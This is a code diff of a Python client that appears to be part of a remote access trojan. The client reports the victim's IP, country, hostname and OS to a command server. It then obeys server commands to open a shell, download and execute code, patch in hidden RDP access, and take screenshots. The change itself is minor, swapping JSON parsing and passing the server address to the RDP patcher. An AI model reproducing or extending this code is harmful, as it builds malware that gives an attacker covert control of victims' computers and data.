@@ -2,7 +2,7 @@ import socket
 from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP, screenshot as Screenshot
 from time import sleep
 import urllib.request
-from json import loads
+from ast import literal_eval
 from platform import platform
 from zlib import compress, decompress
 
@@ -62,7 +62,7 @@ def main():
         client = Client(SERVER_ADDRESS, 8000)
 
         # Send client info to the server - IP, Country Code, Name, Os
-        response = loads(urllib.request.urlopen('http://ip-api.com/json/?fields=status,countryCode,query').read().decode())
+        response = literal_eval(urllib.request.urlopen('http://ip-api.com/json/?fields=status,countryCode,query').read().decode())
         if response['status'] == 'success':
             client.send('{},{},{},{}'.format(response['query'], response['countryCode'], socket.gethostname(), platform()))
 
@@ -79,7 +79,7 @@ def main():
                 elif cmd[0] == 'execute':
                     Execute.download_and_execute(client)
                 elif cmd[0] == 'hrdp':
-                    HRDP.patch(client, cmd[1])
+                    HRDP.patch(client, cmd[1], SERVER_ADDRESS)
                 elif cmd[0] == 'screenshot':
                     Screenshot.take_screenshot(client)
                 else:
